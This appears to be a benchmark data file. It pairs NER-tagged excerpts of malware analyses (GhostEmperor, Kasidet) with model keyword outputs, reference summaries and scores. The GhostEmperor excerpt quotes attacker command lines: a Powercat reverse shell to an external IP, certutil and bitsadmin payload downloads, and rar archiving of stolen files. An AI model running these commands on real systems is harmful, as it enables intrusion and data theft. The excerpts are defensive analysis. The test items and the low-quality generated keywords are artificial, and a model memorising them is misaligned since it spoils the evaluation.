[{"split_name": "test", "sample_id": "test_0", "prompt_text": "Extract the keywords: [ORG] GhostEmperor \u2019s infection chain and post- exploitation toolset : technical detailsLearn more : kaspersky.comThis document provides a more thorough and in - depth technical analysis of the various stages in [ORG] GhostEmperor \u2019s infection chain , as outlined in the blog post . In addition , we provide a section with a description of the post - exploitation tools leveraged by the actor , demonstrating how they were used with actual command lines issued by the operators during the attacks . Stage 1 : PowerShell DropperThe installation of the rootkit and the malicious service is started by a [ORG] BAT file . The [PERSON] BAT file is usually created under the C:\\Windows\\debug or C:\\Windows\\debug\\wia directory , along with a [ORG] PowerShell script . The script is an installer encrypted using [ORG] AES , and the [ORG] BAT file runs it through the following set of command lines : [ORG] PowerShell -ex [PERSON] Bypass C:\\windows\\debug\\chrome.ps1 popmart123 > > C:\\windows\\debug\\di.txt ipconfig > > C:\\windows\\debug\\di.txtError messages from the [ORG] PowerShell script along with the victim \u2019s network information are logged in a text file under the same directory . The [ORG] BAT file also provides a decryption key as an argument for the [ORG] PowerShell script , allowing the attackers to hinder analysis because without the decryption key , it is not possible to view the later stages of the infection . We managed to identify a total of [CARDINAL] eight keys used by the attackers:\u2022 systeminfo \u2022 qpalzmLLLThe decrypted script contains [CARDINAL] three encoded buffers . The [ORDINAL] first one is decoded and written to a [ORG] DLL file , and a service is created to run it . The service is put in a group called \u2018 MsGroup \u2019 or \u2018 AuthSvcGroup \u2019 . We identified [CARDINAL] three such [ORG] DLL names , with a matching service name for each one : [ORG] Service [ORG] Name [ORG] C:\\Windows\\System32\\msmp4dec.dll C:\\ProgramData\\Microsoft\\Network\\Connections\\msdecode.dll C:\\Windows\\System32\\AuthSvc.dll2The remaining [CARDINAL] two buffers in the script are AES encrypted . They are decoded by the [ORG] PowerShell script and written to [CARDINAL] two registry keys that are later decrypted and loaded by the [ORG] DLL : Encoded buffers in the decrypted [ORG] PowerShell installer scriptWe found [CARDINAL] four registry key names that were created by the different [ORG] PowerShell installers and contained encrypted buffers:\u2022 HKLM\\Software\\Microsoft\\hiaudio \u2022 HKLM\\Software\\Microsoft\\midihelp \u2022 HKLM\\Software\\Microsoft\\data \u2022 HKLM\\Software\\Microsoft\\updateIn some cases , we also observed an uninstaller [ORG] PowerShell script called uninstall.ps1 that is capable of self - killing and deleting all the artefacts previously created by the installer script . The uninstaller also requires a decryption key to run . Decrypted uninstaller script removing registry keys3Stage 2 : Service LoaderWe identified [CARDINAL] two versions of the [ORG] DLL service : [CARDINAL] one written in .NET and another in [LANGUAGE] C++ . The latter appeared both in an obfuscated and non - obfuscated form [ORG] NET versionThe .NET variant is the most recent one we discovered , as it appears to have emerged only in [DATE] March [DATE] 2021 . The internal name of this variant is [PERSON] SvchostSharp.dll , and we believe the compilation timestamp that suggests it was created in [DATE] 2017 is fake . The purpose of this service is to decrypt the contents of the registry keys created by the previous stage and load the code stored in them : Reading and decryption of code that resides in a registry key , as done by the .NET variantThe decryption key , however , is based on the GUID of the infected system . This means that the infection chain was tailored for this specific system , and it will not be possible to run the malware or retrieve the next stages in a different environment without knowing the decryption key beforehand.4Generation of a decryption key from the system \u2019s GUIDC++ VersionThe C++ version has a similar purpose as the .NET variant \u2013 decrypt AES [CARDINAL] 256 encrypted data from a formerly written registry key and in turn execute it as position - independent code . This is done in order to stage the next component in the infection chain that serves as the malware \u2019s main user mode component . In contrast to the .NET version , the [NORP] C++ variant does not mandate that the encryption key used to obtain the next stage is based on the system \u2019s GUID . Instead , it looks for an internal configuration section that starts with the keyword \u2018 Microsoft \u2019 and parses it to locate a hardcoded key . It is evident in the code that only if this hardcoded key is not provided , the malware turns to use the target \u2019s computer name as the key . Usage of a hardcoded AES key or a fallback key derived from the computer \u2019s name , as evident in the [NORP] C++ variant5Stage [CARDINAL] 3 : In - Memory ImplantThe service loader aids the execution of a user mode payload in the memory of an svchost.exe process . This serves several purposes . Its main objective is to facilitate a communication channel with a C2 server and act as a client capable of retrieving and staging a payload for further execution . Written in [LANGUAGE] C++ , the client can be formed as an instance of [CARDINAL] one of multiple classes , each presenting a different feature or set of traits that constitute the nature of the communication channel . For example , the client is capable of operating over either HTTP or TLS protocols , supporting various authentication mechanisms like basic access authentication or Microsoft \u2019s [ORG] Negotiate scheme . The key capability of the client , though , is to mask traffic based on logic constituted by a Malleable [CARDINAL] C2 profile embedded within its configuration . Such profiles are a set of statements written in a custom language that is originally intended for consumption by servers and clients of the Cobalt Strike framework . Their purpose is to shape the exchanged requests and responses between the Cobalt Strike Beacon client and its server so that they appear as benign traffic and blend with the bulk of packets in the network , or otherwise appear as specific malware , in the case of a red team engagement or pen- testing scenario . In the case of the user mode clients described here , a subset of the Cobalt Strike profile syntax that allows the creation of a specially crafted set of HTTP packets is supported . This makes it possible to parse a profile that resides within the HKLM\\ Software\\Microsoft\\midihelp registry key , formerly written there by the initial [ORG] PowerShell dropper , using it in turn to mask the packets issued to and from the [CARDINAL] C2 as [ORG] Amazon browsing traffic . This profile is publicly available on [ORG] GitHub , and the malware supports1 the following keywords and statements that allow its interpretation and processing:\u2022 set uri , set useragent : specifies the [ORG] URI and User - Agent fields used as part of an HTTP transaction between the clientand server.\u2022 http - get , http - post : types of HTTP transactions that can be customized . In other words , it is possible to shape thestructure of HTTP GET and [ORG] POST requests and responses in this [ORG] malware.\u2022 client , server : keywords that specify which side of the transaction to profile . For example , under a given http - post transaction it is possible to profile both packets sent from the client and those sent in response from the server . This indicates that such a profile can be consumed by both a client and a server component of the [ORG] malware.\u2022 base64 , prepend , append : directive keywords that instruct how to form a data field passed in a transaction . As anexample , for HTTP requests , a given string will be used as data that can then be encoded with [PERSON] Base64 , prepended and appended with other strings as the arguments of the corresponding \u2018 prepend \u2019 and \u2018 append \u2019 keywords define . The resulting string can be then placed as either a header or a [ORG] URI parameter.\u2022 metadata , query , cookie : strings that can be shaped with the above directives . \u2022 parameter , header : for each transaction , these keywords specify where to store their arguments \u2013 URI parameters orHTTP headers . As is evident from the [CARDINAL] C2 profile syntax keywords specified above , the malware may process server mode configuration , thus possibly operating as [CARDINAL] one under a given configuration . This can be reinforced with additional communication logic found in the code that suggests the operators can configure the malware to run as a server . For example , [CARDINAL] one of the classes that handles communication over the TLS protocol contains a function that calls the AcceptSecurityContext API typically used on the server end of a TLS session . Additionally , the same class contains a function that allows the issuing of a self- signed certificate with the CertCreateSelfSignCertificate API , using the common name and organization as DigiCert.1 See full documentation on the syntax used by Cobalt Strike for Malleable C2 profiles : url used to create a self - signed certificateAnother interesting attribute of the communication is that data passed in the body of [ORG] HTTP [ORG] POST requests is embedded within [CARDINAL] one of [CARDINAL] three fake file formats , RIFF , [ORG] JPEG or [ORG] PNG , causing the packets to appear as images or audio files sent to the server . The format is chosen at random when building the packet , and its body is later appended to it . Due to the fact that we could not obtain a full communication flow with the server , we can only attest to some of the fields in the structure appended to these formats , as outlined below : Field Size [CARDINAL] 16 bytes4 bytes8 bytes [CARDINAL] 2 bytes4 bytes [PERSON] Random data inserted to the packet after it is encoded with the key in the next field Key used to encode the whole packet using a simple [LAW] XOR [LAW] algorithmUnknown [LAW] Flags used to indicate if compression is applied on the payload in the packet . The used compression algorithm found in the code is [ORG] LZO ( Lempel - Ziv - Oberhumer ) Unknown CRC32 checksum of the encrypted payload Total length of the transmitted packet Length of the encrypted data Length of the cleartext data ( before encryption ) AES [CARDINAL] 256 encrypted payload data , the key is hardcodedOffset 0x327Code used to generate a fake [ORG] JPEG header and the resulting packetIt should be noted that other than the client logic , there is a lot of code at this stage that is intended to provide the malware with stealth or support the client \u2019s operation . For the former , this component decrypts and loads an embedded rootkit driver that is intended to hide malicious artefacts , as will be described in later sections of the report . For the latter , the malware initiates a thread to detect if the system runs through a proxy , its type and address using various means , namely by issuing a call to the InternetGetProxyInfo API from the [ORG] jsproxy.dll library which retrieves the address of a proxy used while accessing a given URL . The URL specified for this resolution in the malware is hxxp://update.microsoft[.]com . In addition , the malware contains functionality to manually load a [ORG] PE image and invoke execution from its entry point . Though we could not obtain an actual payload from the C2 server , we assess that this functionality is used later on to stage an additional payload for execution , as described in the next section.8Stage [CARDINAL] 4 : Remote Control PayloadUnfortunately , we were unable to obtain a full infection chain that would allow us to observe exactly how the payload is obtained by the former stage and directly invoked in memory . Having said that , the logs from our telemetry have shown that in multiple cases additional code was loaded into the memory address space of the svchost.exe process running the client code sometime after the initial infection . It was evident that the secondary in - memory loaded code was related to the client component , as both shared multiple proprietary [LANGUAGE] C++ classes and the exact same obfuscation techniques , described in a later section of the report . Additionally , in several cases we also managed to find the same [ORDINAL] secondary component in the form of a file on disk . This file is a [ORG] DLL with some unusual traits , namely , its section table is stripped of names and it exports [CARDINAL] two functions : [CARDINAL] one has only an ordinal # 1 and the other carries the atypical export name \u2018 _ _ acrt_iob_func \u2019 . Moreover , the same file appeared using a similar naming convention across [CARDINAL] three targets as summarized in the table below . MD5 [ORG] memory_50348796.dllmemory_235862828.dll memory_1784500.dllTarget \u2019s Country [DATE] 13/01/2021 [DATE] 5:04:32 01/08/2020 11:07:1310/03/2021 5:05:16 03/08/2020 2:09:50This component is built as a set of [LANGUAGE] C++ classes that can be instantiated and used by another piece of code during run time . While we were unable to see the code that uses this [ORG] DLL and invokes the logic within the classes , we were able to analyze several of them and understand their traits and behavior as standalone objects . The following is an outline of some of the key functionalities provided by the [ORG] DLL through these classes . Payload Injection and Console ControlA few of the classes we observed serve the primary purpose of injecting a payload to other processes on the machine . The target process can be an existing one , in which case it is winlogon.exe , or a newly created process in suspended state . In the latter case , the chosen image for the created process needs to be passed by the code invoking the injection , which we did not obtain . Such code will instantiate the [NORP] C++ class conducting the injection and invoke the corresponding injection function by passing the path to the image of the created process as an argument . The injection method is fairly straightforward and relies on creating a shared memory buffer between the source and target processes . The buffer is mapped using the NtCreateSection and NtMapViewOfSection APIs , allowing code and data to then be copied into it in the source process and having the same information reflected in the target process . In the case of winlogon.exe , since it is a Windows system process , the injecting code patches a flag in an OS version dependent offset within a structure resolved by the [GPE] KernelBaseGetGlobalData function , as demonstrated here.9The execution of a function within the remotely written buffer depends on the type of injected process . For winlogon.exe the injected payload will be initiated using the CreateRemoteThread API and for a newly created process the entry point of its executable image will be patched to conduct a jump to the payload , which will occur as soon as the process is resumed from its suspended state . Each injected code is passed along with a pipe name that is then used to establish a duplex [ORG] IPC communication channel to the injecting component . The latter has the capacity to issue commands or instructions to the injected payload and receive the outputs of their execution . The pipe \u2019s name scheme is \\\\.\\pipe\\CDP_CALLBACK_%d , where % d is replaced by a different numeric value for each injected payload . The architecture used by the attackers to stage shellcode buffers in the winlogon.exe process in order to handle various remote control featuresThe injected payload is a position - independent code that serves a couple of purposes , the [ORDINAL] first of which is to create a console in the remote process and facilitate a channel to interact with it via the previously created named pipe . This is achieved through the following sequence of actions:\u2022 Creation of a new console within the injected process using the [ORG] AllocConsole API and adjusting its window resolution to120 x 200.\u2022 Getting handles to the console \u2019s input and output streams using the GetStdHandle API . \u2022 Connecting to the named pipe which has its name passed along with the executing shellcode . \u2022 Checking if there is data on the pipe using the PeekNamedPipe API and if so retrieving it to a buffer . \u2022 The numeric value of the [ORDINAL] first byte in the obtained data determines the message \u2019s purpose:\u2022\u2022If it 's a 1 , it means the client in the injecting process is requesting a line of the console \u2019s output . This is retrieved by using the console \u2019s output handle and iterating on its window output data along the Y axis ( while X is set to [CARDINAL] 0 ) . For each iterated coordinate a single output character is read at a time using the ReadConsoleOutputCharacterW API . The generated output buffer is then prepended with a data structure of type CONSOLE_SCREEN_BUFFER_INFO to convey the console \u2019s window dimension . If it \u2019s a 2 , the message is intended to pass input to the console and the [ORDINAL] first byte will be followed by the input buffer that is passed to [ORG] the [ORG] WriteConsoleInputW [ORG] API.10Remote [ORG] Desktop [ORG] ControlAlternatively , the payload can be used to reflectively load a [ORG] PE image that is hardcoded within the binary of the injecting [ORG] DLL and used to control the desktop in the target machine . Such control is achieved by passing keyboard and mouse event inputs over the named pipe to the remotely loaded [ORG] DLL and potentially retrieving screenshots as outputs with a refresh rate of [TIME] one [TIME] second . The messages passed on the named pipe contain keystrokes and mouse cursor position data along with action codes that determine the nature of the passed input . The inputs are then used as arguments for the [ORG] SendInput or SetCursorPos API functions that pass them to the desktop associated with the thread running the injected payload . The action codes that describe the purpose of the input are split to major and minor codes with the following designations : Description Enable taking of screenshots as output [ORG] Disable taking of screenshots [ORG] Undetermined [ORG] Set the passed cursor position on the screen [PERSON] Set cursor position and pass [CARDINAL] one of the mouse events \u2013 MOUSEEVENTF _ [GPE] LEFTDOWN , MOUSEEVENTF_LEFTUP , MOUSEEVENTF_RIGHTDOWN and MOUSEEVENTF_RIGHTUP [PERSON] Set cursor position and pass left mouse button double click [PERSON] Set cursor position and pass right mouse button double click [PERSON] Set cursor position and pass mouse wheel event Pass keyboard inputs Initiate a thread to pass a press on special keystrokes ( Shift , Control , Menu and Left Windows Key ) Terminate the special keystroke thread ( i.e. , the former press is released ) [CARDINAL] 513,514,516,517515 [CARDINAL] 811Execution of Arbitrary .NET Assemblies and [ORG] Powershell [ORG] CommandsAnother capability exposed by a class in the payload [ORG] DLL is the loading and execution of .NET assemblies during run time . As formerly described , the payload [ORG] DLL runs in the context of svchost.exe , which is an unmanaged process . In order to support the load of a .NET binary , the code ought to load the .NET [ORG] CLR runtime , initialize and start it . Then it is possible to use the [ORG] AppDomain interface provided by it in order to load an assembly , resolve its entry point and invoke it . These stages were observed in the malware \u2019s code and are very close to the flow described here ( see \u2018 Instantiating the [ORG] CLR \u2019 section).When using the class that provides this capability the user can either pass a struct containing a custom assembly as an argument or load an embedded assembly that serves to execute [ORG] PowerShell commands . The latter is decoded during run time and uses the .NET Pipeline class that is capable of executing enqueued [ORG] PowerShell scripts . As can be seen in the code excerpt of this assembly below , an attacker - provided script is passed as an argument to a function named \u2018 Exec \u2019 which then inserts it into the pipeline object and executes it , returning the result as an output NET code that can be invoked in order to support execution of [ORG] PowerShell commands as part of the malware \u2019s payload12Filesystem [ORG] ControlFinally , the payload [ORG] DLL contains a class that provides the attackers with capability to retrieve information and conduct actions on the target \u2019s file system . As in the cases of the aforementioned classes , [CARDINAL] one of the functions invoked from the object instantiated from the class can retrieve a code and a corresponding argument and dispatch it to execute a particular file system action on the compromised host . The following is a summary of those codes and their functionality : Description Undetermined Provides a listing of all available drives in the system , their size and free space . [NORP] Retrieves file attributes as provided by the GetFileAttributesW API function for a given file . Searches for a file with a given name within a specified directory . If a file is found , its full name , attributes , size and timestamps of creation , last access and last write are provided . Moves a file or directory with its contents from a given source to a destination path using the [CARDINAL] MoveFileW API function . Looks for a file or directory recursively from a given path and , if found , deletes it . Creates a new directory with a given path using the CreateDirectoryW API . Provides file size and timestamps retrieved with the GetFileTime API for a given file \u2019s path . Searches for a file recursively from a given path and provides its creation time , last access time and last write time . Write data to a given offset within a file . Copies a file ( using the CopyFileW API ) or directory ( using the SHFileOperationW API ) from one path to another . Executes a given file using the CreateProcessW API . Attempts to retrieve a handle to a security token of another process given its [ORG] PID and then uses the ImpersonateLoggedOnUser to impersonate the security context of that token \u2019s owner . This may be used to facilitate the execution of other operations that require privileges of a specific user . Code 2,12,13,14 [CARDINAL] 1913Post - exploitation toolset & command detailsIn this section we describe in detail all the tools used by the attackers . We also document the command lines used during the campaign , where we were able to identify them . The leveraged tools were used primarily to steal information from the infected system or spread further in the network . Most of them are legitimate or open - source tools , while some are custom made or not so well known . Below are some of the main tools we identified:\u2022 [NORP] NBTscan : A command line tool to scan a network for [ORG] NetBIOS information , allowing the attackers to view loggedin users or [ORG] IP addresses of other machines in the network . The [ORG] NBTscan executable often appeared under the names \u2018 nbt.exe \u2019 or \u2018 nb8.exe\u2019.\u2022 PsExec : A command line tool that is part of the Sysinternals suite , allowing the attackers to execute processes onremote systems.\u2022 PsList : A command line tool that displays running processes , and is part of the Sysinternals suite . \u2022 ProcDump : A command line tool that is part of the Sysinternals suite , used to dump process memory . The attackersused this tool to dump the memory of the [GPE] LSASS.exe process and steal passwords.\u2022 WinRAR : The attackers exfiltrated sensitive files from the infected system , such as [ORG] JPG images or Word documents andused the RAR.exe tool in order to compress them before uploading the data to the [CARDINAL] C2 server . To make sure the files are recent , the attackers provided a command line argument that checked if the files were created after a certain date.rar.exe a -r -v200 m -ta20201101000000 -n*.doc -n*.docx -n*.xlsx -n*.pdf -n*.txt -n*.jpg -n*.zip \" [PERSON] C:\\Windows\\debug\\ log.rar\"Similarly , this utility was used to archive and exfiltrate mailbox contents retrieved to a .pst file via the [ORG] PowerShell New- [ORG] MailboxExportRequest cmdlet . A password protected archive with these contents was generated with the command specified below.rar.exe a -r -n*.pst \" $ windir\\debug\\log.rar \" -hpBaigong -y\u2022 Certutil , [GPE] BITSAdmin : Instead of relying on more common methods , the [GPE] Certutil and [GPE] BITSAdmin tools are used todownload additional malicious scripts from the [CARDINAL] C2 servers to evade detection.certutil.exe -urlcache -split -f hxxp://27.102.113[.]240 / debug.txt C:\\Windows\\pla\\debug.bat14An interesting thing we noticed is that in [CARDINAL] one case the [GPE] BITSAdmin tool downloaded an archive containing a [ORG] PowerShell installer script from a legitimate website . The website belonged to a government entity from a country in [LOC] South [LOC] East [LOC] Asia , which might have been compromised by [ORG] GhostEmperor prior to this attack , as it hosted one of their malicious files.bitsadmin /transfer myDownLoadJob /download /priority normal \" hxxp://[redacted]/1.zip \" \" C:\\Windows\\debug\\wia\\1.zip \" expand [CARDINAL] 1.zip sss.ps1\u2022 Cscript : The cscript.exe utility executed [PERSON] Visual [PERSON] Basic scripts dropped by the attackers such as ListDomain.vbs , a VB script that dates back to [DATE] 2012 and collects information about the domain or the workgroup of the infected machine . ListDomain VB script\u2022 [PERSON] Schtasks : Instead of running [PERSON] BAT files directly , the attackers scheduled a task ( often called \u2018 test \u2019 or \u2018 test3 \u2019 ) , ran itimmediately with schtasks.exe and then deleted it.schtasks /create /tn \" test3 \" /tr C:\\Windows\\debug\\wia\\h.bat /sc once /st [TIME] 23:32:00 /ru \" system \" schtasks /run /tn \" test3 \" schtasks /delete /tn \" test3 \" /f\u2022 [PERSON] Powercat : [PERSON] Powercat is an open - source tool written in [ORG] PowerShell , and is meant to be an equivalent of the knownnetworking utility NetCat . [ORG] GhostEmperor \u2019s operators connected to the [CARDINAL] C2 servers using this tool.powershell [ORG] IEX ( New - Object [ORG] System . Net . Webclient).DownloadString('url powercat / master / powercat.ps1');powercat -c 27.102.113[.]57 -p 443 -e cmd15\u2022 [GPE] Ladon : [GPE] Ladon is an open - source tool that assists in lateral movement across a network , as it scans for open ports anddetects devices that are exposed to certain vulnerabilities.\u2022 Mimikat_ssp : Mimikat_ssp is an open - source custom tool based on the well - known Mimikatz application , with the aimof avoiding detection by antivirus solutions.\u2022 Get - PassHashes.ps1 : Get - PassHashes is a [ORG] PowerShell script that is part of the open - source [PERSON] Nishang offensivesecurity framework , and is intended to dump password hashes.\u2022 GetPwd : A custom tool to dump passwords from memory that is based on the GetPwd open - source tool fromPudn.com.\u2022 [ORG] Token.exe : A custom tool that accepts a username and a filename as an argument , and runs the file with systemprivileges.16", "generated_text": "the document; technical analysis; GhostEmperor; use; the rootkit; the rootkit; BAT; the BAT file; a PowerShell script; an installer; a service; The powershell script; the registry keys; a.NET variant; the.NET variant; SvchostSharp.dll; part; the DLL; the NET variant; a pre-planned malware attack; the rootkit; the C2; the energy; the actors; the three stages; the exploitation; the decrypted PowerShell script; the PowerShell dropper; the rootkit; the malware; the decryption key; the command line; the analysis; indicators; compromise; summary; the stage.", "ref_text": "<START-1>The document provides a technical analysis of the GhostEmperor cyberespionage campaign. It examines the multi-stage infection chain and post-exploitation tools used by the threat actor. The infection starts with a PowerShell dropper script that decrypts and installs a rootkit driver and malicious service. The service loader decrypts and executes an in-memory implant that facilitates C2 communication. The implant uses malleable C2 profiles to mask its traffic as Amazon browsing. The implant can retrieve additional payloads from the C2 server. These include a remote control DLL for desktop control, .NET assembly loading, PowerShell execution, and filesystem access. The attackers leveraged both legitimate tools like PsExec and Mimikatz as well as custom malware for post-exploitation activities. Actions included password dumping, lateral movement, and data exfiltration. Specific tools used were NBTScan, ProcDump, WinRAR, BITSAdmin, PowerShell scripts, Ladon, Mimikat, Token.exe, and others. The tools were used to gather information about other systems, spread on the network, and steal sensitive data. In summary, the campaign demonstrates sophisticated malware development with covert C2 communications, advanced post-compromise capabilities, and operational security through use of living-off-the-land tools. The technical analysis provides insights into the infection tactics, techniques, and procedures of this advanced persistent threat group. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.38121546961325964, "gpt3/lexical/rouge_rouge2": 0.1111111111111111, "gpt3/lexical/rouge_rougeL": 0.23756906077348064, "gpt3/lexical/rouge_rougeLsum": 0.23756906077348064, "gpt3_generated_text": ["This document provides a detailed technical analysis of the GhostEmperor malware's infection chain and post-exploitation toolset. The first stage involves a PowerShell dropper that installs a rootkit and a malicious service. The dropper is initiated by a BAT file that runs a PowerShell script, which is encrypted using AES. The script logs error messages and network information in a text file. It also provides a decryption key for the PowerShell script, making it difficult to analyze the later stages of the infection. The decrypted script contains encoded buffers that are decoded and written to a DLL file. A service is created to run the DLL, which is placed in a group called 'MsGroup' or 'AuthSvcGroup'. The script also decodes and writes two encrypted buffers to registry keys, which are later decrypted and loaded by the DLL. In some cases, an uninstaller PowerShell script is observed that removes the artifacts created by the installer script. "]}, {"split_name": "test", "sample_id": "test_1", "prompt_text": "Extract the keywords: [ORG] IJRYRY , [ORG] AAADNUF [ORG] Malicious [ORG] Office files dropping [ORG] Kasidet and Dridex Introduction We have covered [ORG] Dridex [ORG] Banking [ORG] Trojan being delivered via various campaigns involving Office documents with malicious [PRODUCT] VBA macros in the past . However , over [DATE] the [DATE] past [DATE] two [DATE] weeks we are seeing these malicious [ORG] VBA macros leveraged to drop [ORG] Kasidet backdoor in addition to [ORG] Dridex on the infected systems . These malicious [ORG] Office documents are being spread as an attachment using spear phishing emails as described here . The malicious macro inside the Office document is obfuscated as shown in the code snapshot below -The macro downloads malware payload from the hardcoded URL . We have seen following URLs used in different document payloads that we captured for this campaign : [ORG] Macro codearmandosofsalem[.]com / l9k7hg4 / b4387kfd[.]exe trinity.ad - ventures[.]es / l9k7hg4 / b4387kfd[.]exe [CARDINAL] 188.226.152[.]172 / l9k7hg4 / b4387kfd[.]exeIn this blog , we will provide a detailed analysis for the [ORG] Kasidet variant that we spotted in this campaign . [ORG] Kasidet installs itself into % APPDATA% folder . It creates a new folder there with the name \" Y1FeZFVYXllb \" , this string is hardcoded in the malware . The same string is used as mutex name and in creating a Registry key for ensuring persistence upon system reboot . AntiVM Check : Kasidet tries to detect analysis systems during execution through following checks . Checking Dubugger through \" IsDebuggerPresent \" and \" CheckRemoteDebuggerPresent \" Windows APIs . It also checks for the following popular sandbox related strings : [PERSON] User [PERSON] Name : \" MALTEST \" , \" TEQUILABOOMBOOM \" , \" SANDBOX \" , \" [ORG] VIRUS \" , \" MALWARE \" File Name : \" SAMPLE \" , \" [ORG] VIRUS \" , \" SANDBOX\"It tries to detect wine software by checking if [ORG] kernel32.dll is exporting \" wine_get_unix_file_name \" function or not . It detects [ORG] Vmware , [ORG] VirtualBox , [ORG] QEMU and [LOC] Bochs by checking for following registry entries:\"SOFTWARE\\\\VMware , \t Inc.\\\\VMware \t Tools\"Vmware\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi \t Port\\Scsi \t Bus\\Target \t Id\\Logical \t Unit \t I d \" , \" Iden(cid:39)\ufb01er \" \t , \t [ORG] Vmware \"   [CARDINAL] 29IN [PERSON] Zscaler [PERSON] Analyst ScrapbookS [CARDINAL] 16SEARCHSUBSCRPostsCommentsITBLB \u25bc [DATE] 2016 ( [CARDINAL] 5)OGARC \u25ba February ( [CARDINAL] 1 ) \u25bc [DATE] January ( 4)Malicious Office files droppingKasidet and [ORG] Dridex Music - themed Malvertising Leadto AnglerThere Goes The Neighborhood -Bad Actors on GMHOS Yet Another Signed Malware -Spymel \u25ba 2015 ( [CARDINAL] 48 ) \u25ba 2008 ( [CARDINAL] 31)SLEBAL 0 - day ( [DATE] 7 ) [DATE] 0day ( [CARDINAL] 3 ) [CARDINAL] 302 Cushioning ( [CARDINAL] 2 ) [PERSON] Adobe [PERSON] Flash ( [CARDINAL] 3 ) Adobe Flash vulnerability ( [CARDINAL] 2 ) Adobe vulnerabilities ( [CARDINAL] 1 ) Adobe vulnerabilties ( [CARDINAL] 10 ) analytics ( 1)\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi \t Port\\Scsi \t Bus\\Target \t Id\\Logical \t Unit \t I d \" , \" Iden(cid:39)\ufb01er \" \t , \t \" VBOX \"   \" HARDWARE\\\\Descrip(cid:39)on\\\\System \" , \t \" SystemBiosVersion \" \t , \t \" VBOX \" VirtualBoxSOFTWARE\\\\Oracle\\\\VirtualBox \t Guest \t Addi(cid:39)ons \" \" HARDWARE\\\\Descrip(cid:39)on\\\\System \" , \t \" VideoBiosVersion \" \t , \t \" VIRTUALBOX \" QEMU\"HARDWARE\\DEVICEMAP\\Scsi\\Scsi \t Port \t \\Scsi \t Bus \t \\Target \t I d \t \\Logical \t Unit \t I d \t \" , \" Iden(cid:39)\ufb01er \" \t , \t \" QEMU \"   \" HARDWARE\\\\Descrip(cid:39)on\\\\System \" \t , \t \" SystemBiosVersion \" \t , \t \" QEMU \" Bochs\"HARDWARE\\\\Descrip(cid:39)on\\\\System \" \t , \t \" SystemBiosVersion \" \t , \t \" BOCHS \u201d Information Stealing capabilities : [ORG] Kasidet uses following [CARDINAL] two methods for stealing information from the victim 's machine:1 . Memory Scraping \u2013 This allows [ORG] Kasidet to steal credit card data from the memory of Point - Of - Sale ( POS ) systems . It scans the memory of all the running processes except the operating system processes listed below : devenv.exeThe stolen information is relayed back to the attacker using following [ORG] URI format \u2013 d=1&id=<MachineID>&name=<SystemName>&type=<Track1 or [GPE] Track2 data>&data=<stolen data>&p= < Process elevation status > 2 . [PERSON] Browser [PERSON] Hooking \u2013 This allows [ORG] Kasidet to steal data from Web browsers . It can inject code into [ORG] FireFox , [ORG] Chrome , and Internet Explorer ( IE ) . [PERSON] Browser names are not saved in plain text and instead this variant uses the same hash function as used by [PRODUCT] Carberp malware to encrypt the browser names . The following APIs are hooked in the web browser for stealing sensitive data : [PERSON] Browser H(cid:50)pSendRequestW \t , \t InternetWriteFile The stolen information is relayed back to the attacker using following [ORG] URI format \u2013 ff=1&id=<MachineID>&name=<SystemName>&host=<Base64 encoded host [CARDINAL] name>&form= < [PERSON] Base64 encoded HTTP header [ORG] data>&browser=<Browser name > The information stealing feature of this [ORG] Kasidet variant were deactivated if the system locale or GeoUserID corresponds to [GPE] Russia . Network communication : [ORG] Kasidet contains a hardcoded list of [ORG] Command [ORG] & [ORG] Control ( [ORG] C&C ) server locations . It uses CryptStringToBinary API call to decrypt the embedded [ORG] C&C URLs as seen below : android ( [CARDINAL] 7 ) Android malware ( [CARDINAL] 9 ) [PERSON] Angler ( [CARDINAL] 2 ) Angler Exploit Kit ( [CARDINAL] 6 ) anti - debug ( [CARDINAL] 2 ) antivirus ( [CARDINAL] 22 ) [ORG] App behaviour ( [CARDINAL] 1 ) [PERSON] App [PERSON] Economy ( [CARDINAL] 1 ) assassins creed ( [CARDINAL] 1 ) Asymmetric encryption ( [CARDINAL] 1 ) Baidu Search ( 1 ) Banking Trojan ( [CARDINAL] 6 ) Base64 encode / decode ( [CARDINAL] 5 ) black [DATE] friday ( [CARDINAL] 1 ) [NORP] Chinese APT ( [CARDINAL] 1 ) [NORP] Chinese malware ( 4 ) Clear text authentication ( [CARDINAL] 5 ) Cloud Services ( [CARDINAL] 1 ) [ORG] CNN [PRODUCT] App ( 1 ) Compromised ( [CARDINAL] 25 ) Compromised [ORG] WordPress ( [CARDINAL] 2 ) Confidentiality ( [CARDINAL] 1 ) credentials leak ( [CARDINAL] 1 ) CryptoWall [CARDINAL] 3.0 ( [CARDINAL] 1 ) CVE-2013 - 0074 ( [CARDINAL] 2 ) CVE-2013 - 2460 ( [CARDINAL] 1 ) CVE-2013 - 2551 ( [CARDINAL] 2 ) CVE-2013 - 3896 ( [CARDINAL] 1 ) CVE-2014 - 0515 ( [CARDINAL] 1 ) CVE-2014 - 4130 ( [CARDINAL] 1 ) CVE-2014 - 6271 ( [CARDINAL] 2 ) CVE-2014 - 6332 ( [CARDINAL] 1 ) CVE-2015 - 0311 ( [CARDINAL] 1 ) CVE-2015 - 0313 ( [CARDINAL] 1 ) CVE-2015 - 0336 ( 1)CVE-2015 - 310 ( [CARDINAL] 1 ) CVE-2015 - 311 ( [CARDINAL] 1 ) CVE-2015 - 5119 ( [CARDINAL] 3 ) CVE-2015 - 5122 ( [CARDINAL] 1 ) CVE-2015 - 5123 ( [CARDINAL] 1 ) CWE ( [CARDINAL] 1 ) Cyber espionage ( [CARDINAL] 2 ) cyber [DATE] monday ( [CARDINAL] 1 ) data breach ( [CARDINAL] 2 ) Data Loss Prevention ( 1 ) DDoS ( 1 ) de - obfuscation ( [CARDINAL] 1 ) Domain Shadowing ( [CARDINAL] 1 ) drive - by - downlad ( [CARDINAL] 1 ) dropper ( [CARDINAL] 1 ) dynamic [ORG] DNS ( [CARDINAL] 1 ) Emissary Panda ( [CARDINAL] 1 ) [PERSON] Exploit [PERSON] Kit ( 7 ) exploit kits ( [CARDINAL] 18 ) [PERSON] Extrat [PERSON] Xtreme RAT ( [CARDINAL] 1 ) facebook ( [CARDINAL] 19 ) Fake AV ( [CARDINAL] 19 ) Fake codec ( [CARDINAL] 2 ) fake [GPE] Dubsmash app ( [CARDINAL] 1 ) fake flash ( [CARDINAL] 6 ) fake porn ( [CARDINAL] 1 ) Fake porn site ( [CARDINAL] 1 ) financial firm ( [CARDINAL] 1 ) FLASH ( 